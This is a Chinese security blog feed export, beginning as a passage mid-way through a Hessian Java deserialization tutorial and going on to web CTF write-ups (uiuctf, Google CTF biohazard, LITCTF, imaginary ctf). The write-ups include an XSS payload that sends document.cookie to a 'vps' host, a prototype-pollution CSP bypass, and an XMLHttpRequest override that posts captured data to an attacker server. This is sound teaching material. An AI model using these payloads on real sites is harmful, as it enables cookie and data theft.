class="string">&quot;Student readObject call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readResolve call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student hashCode call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student finalize call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, innerMap=&quot;</span> + innerMap +</span><br><span class="line">                <span class="string">&quot;, friends=&quot;</span> + friends +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Serialize-and-DeSerialize"><a href="#Serialize-and-DeSerialize" class="headerlink" title="Serialize and DeSerialize"></a>Serialize and DeSerialize</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLData;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HJSerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(os);</span><br><span class="line">            output.writeObject(t);</span><br><span class="line">            data = os.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(is);</span><br><span class="line">            result = input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (T) result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">111</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hessian&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Class&lt;Object&gt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>, ObjectInputStream.class);</span><br><span class="line">        innerMap.put(<span class="string">&quot;2&quot;</span>, SQLData.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">friend</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">222</span>, <span class="string">&quot;hessian1&quot;</span>, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">friends</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Student&gt;();</span><br><span class="line">        friends.add(friend);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        stu.setId(id);</span><br><span class="line">        stu.setName(name);</span><br><span class="line">        stu.setGender(gender);</span><br><span class="line">        stu.setInnerMap(innerMap);</span><br><span class="line">        stu.setFriends(friends);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian serialize----------------&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] obj = serialize(stu);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(obj));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian deserialize--------------&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> deserialize(obj);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>1.首先通过需要序列化的类，获取到相应的serializer，在通过这个serializer进行writeobject操作<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p><p>2.一般对于自己写的class，他就会获取到defaultserializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>3.在获取serializer的过程中，他会去读取Object中的fields，并对应上serializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p><p>4.获取完serializer，他会有一个将序列化的obj作为key，serializer作为value，加入到一个map和一个cachemap中<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>5.接着就是常规的获取field，然后在根据field的serializer写入数据了<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt><br>大概过程就是</p><ul><li>获取序列化对象相对应的serializer，并获得到fields，每个fields会依次对应上一个serializer</li><li>将serializer加入map和cachemap中</li><li>根据fields写入序列化数据</li></ul><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>首先看到他读取了序列化数据中的第一个字节，并判断是属于那种类型的，并在下面的switch语句中选择使用哪种Serializer去进行序列化，在这里是Map，注意这里的Map并不是说反序列化的类是Map类型的，而是所有Object类型都会被这个readMap处理用来反序列化<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt><br>接下来就是常规的根据field然后deserialize<br>在这里的具体操作就是根据变量名获取到相应的deserialize<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt><br>再在deserialize中获取value，并设置field</p><p><strong>上面的操作最好还是要自己跟一遍</strong></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>与kryo类似，hessian也是因为反序列化Map类型时会调用put方法<br>那利用点也是从hashCode与equals入手了<br>在这里就不重复造轮子了，可以参考这篇文章</p><ul><li><a href="https://paper.seebug.org/1131/">https://paper.seebug.org/1131/</a></li><li>参考marshalsec</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入门Hessian反序列化&quot;&gt;&lt;a href=&quot;#入门Hessian反序列化&quot; class=&quot;headerlink&quot; title=&quot;入门Hessian反序列化&quot;&gt;&lt;/a&gt;入门Hessian反序列化&lt;/h2&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="hessian" scheme="http://example.com/tags/hessian/"/>
    
  </entry>
  
  <entry>
    <title>前端ctf(持续更新)</title>
    <link href="http://example.com/2023/09/06/%E5%89%8D%E7%AB%AFctf/"/>
    <id>http://example.com/2023/09/06/%E5%89%8D%E7%AB%AFctf/</id>
    <published>2023-09-06T00:27:30.000Z</published>
    <updated>2023-09-13T05:30:35.158Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp<br><span id="more"></span></p><h2 id="uiuctf-peanut-xss"><a href="#uiuctf-peanut-xss" class="headerlink" title="uiuctf peanut-xss"></a>uiuctf peanut-xss</h2><p>nutshell.js中有一段代码<br><code>linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>其中innerText会html解码，而innerHTML会把赋值的内容原封不动的输出到页面中，所以如果输入的是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/span&amp;gt;&amp;lt;img src onerror=&amp;#39;fetch(&amp;quot;https:/</span><span class="regexp">/vps/</span>?cookie=&amp;quot;+<span class="variable language_">document</span>.<span class="property">cookie</span>)&amp;#<span class="number">39</span>;/&amp;gt;&amp;lt;span&amp;gt;</span><br></pre></td></tr></table></figure><br>解码完以后就是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;img src onerror=&#x27;fetch(&quot;https:/</span><span class="regexp">/vps/</span>?cookie=<span class="string">&quot;+document.cookie)&#x27;/&gt;&lt;span&gt;</span></span><br></pre></td></tr></table></figure><br>再把解码的内容赋值给innerHTML，那么就会造成dom xss<br>修复这个漏洞的话可以把innerHTML改成innerText<br><code>linkText.innerText = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>当innerText是被赋值的时候，输出到页面的时候会把html编码在输出</p><h2 id="google-ctf-biohazard"><a href="#google-ctf-biohazard" class="headerlink" title="google ctf biohazard"></a>google ctf biohazard</h2><p><a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard">https://github.com/google/google-ctf/tree/master/2023/web-biohazard</a><br>这是官方writeup，只对其中一些点进行记录</p><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当时看到Object.assign联想到了原型链污染，但是我是用类似下面的方式去尝试原型链污染的，显然是失败了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><br>但是如果是下面这种就是可以成功污染的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>((&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h3 id="污染的点-editor"><a href="#污染的点-editor" class="headerlink" title="污染的点 editor"></a>污染的点 editor</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#editor-style&#x27;</span>).<span class="property">content</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当uri开头不是view的时候就会加载这个loadEditorResources函数<br>而这个函数中<br><code>safeScriptEl.setSrc(script, trustedResourceUrl(editor));</code><br>这一段会设置一个js加载进去，<em>并且会设置好nonce</em>，其中editor在bootstrap.js中被定义了，所以只需要原型链覆盖了这个editor就可以了</p><h3 id="绕过csp"><a href="#绕过csp" class="headerlink" title="绕过csp"></a>绕过csp</h3><p>因为有csp策略，无法进行直接加载js，原型链污染不能直接覆盖被赋值的变量，所以利用iframe，设置csp，允许恶意的js加载，并且禁止加载bootstrap，就可以成功绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/views/view/5f1a24e1-2744-42e2-8127-19fccd9c3f98&quot;</span> csp=<span class="string">&quot;script-src https://attack.shhnjk.com/alert.js https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>在这里我想到如果没有nonce，他只是script-src <a href="http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行">http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行</a></p></blockquote><h2 id="LITCTF-2023-fetch"><a href="#LITCTF-2023-fetch" class="headerlink" title="LITCTF 2023 fetch"></a>LITCTF 2023 fetch</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">runHTMLFile</span> = <span class="keyword">async</span> (<span class="params">filePath</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>();</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">`file:<span class="subst">$&#123;filePath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://flag:6969/&quot;</span> + randomString, <span class="literal">false</span>);</span><br><span class="line">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> screenshot = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span class="attr">path</span>: filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>),</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>filePath是我们上传的文件，传入一个html文件，page.goto会访问这个文件，page.evaluate会在访问这个页面的基础上执行里面的代码，也就是访问flag文件<br>只需要将window.XMLHttpRequest给重写了，就可以得到flag<br>wp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> originalXHR = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title function_">originalXHR</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOpen = xhr.<span class="property">open</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url, <span class="keyword">async</span>, user, password</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOnReadyStateChange = xhr.<span class="property">onreadystatechange</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;XHR请求的responseText：&#x27;</span>, xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">let</span> callback = <span class="keyword">new</span> <span class="title function_">originalXHR</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://vps:port/recv&quot;</span>,<span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">send</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (originalOnReadyStateChange) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      originalOnReadyStateChange.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">return</span> xhr;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>onreadystatechange是用于监听 XMLHttpRequest 对象状态改变事件的属性。当XMLHttpRequest的状态发生了改变，就会触发绑定在onreadystatechange上的函数，当readState=4时，代表请求已完成，且响应已就绪。<br>这时候在其中把获取到的flag转发到自己的vps上面，当然也可以直接document.write到页面上，因为runHTMLFile会将页面的截图保存并返回。</p><h2 id="imaginary-ctf-2023-unsanitizer"><a href="#imaginary-ctf-2023-unsanitizer" class="headerlink" title="imaginary ctf 2023 unsanitizer"></a>imaginary ctf 2023 unsanitizer</h2><h3 id="unintended"><a href="#unintended" class="headerlink" title="unintended"></a>unintended</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;text&#x27;</span>).<span class="title function_">send</span>(<span class="string">`Page <span class="subst">$&#123;req.path&#125;</span> not found`</span>)</span><br><span 